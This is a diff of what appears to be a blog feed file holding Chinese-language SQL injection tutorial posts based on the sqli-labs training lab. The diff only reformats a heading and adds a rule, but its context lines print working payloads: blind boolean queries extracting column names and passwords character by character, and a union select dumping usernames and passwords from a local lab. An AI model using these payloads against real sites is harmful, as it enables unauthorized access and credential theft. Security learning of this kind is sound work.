@@ -16,8 +16,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select column_name from information_schema.columns where table_name='user_1' limit 0,1),1,1)))&gt;1#</span></span><br></pre></td></tr></table></figure>
 <p>爆值</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select password from user_1 limit 0,1),1,1)))&gt;1#</span></span><br></pre></td></tr></table></figure>
-<p>接着把brup爆破出来的数值转换一下就可以得到了。</p>
-]]></content>
+<h2 id="接着把brup爆破出来的数值转换一下就可以得到了。"><a href="#接着把brup爆破出来的数值转换一下就可以得到了。" class="headerlink" title="接着把brup爆破出来的数值转换一下就可以得到了。"></a>接着把brup爆破出来的数值转换一下就可以得到了。</h2>]]></content>
   </entry>
   <entry>
     <title>sqli-labs学习sql注入</title>
@@ -38,6 +37,7 @@
 <p><img src="https://img-blog.csdnimg.cn/20200229194221881.png" alt="在这里插入图片描述"><br><strong>爆值</strong></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20200229194455846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样，值就被爆出来了！</p>
+<hr>
 ]]></content>
   </entry>
   <entry>
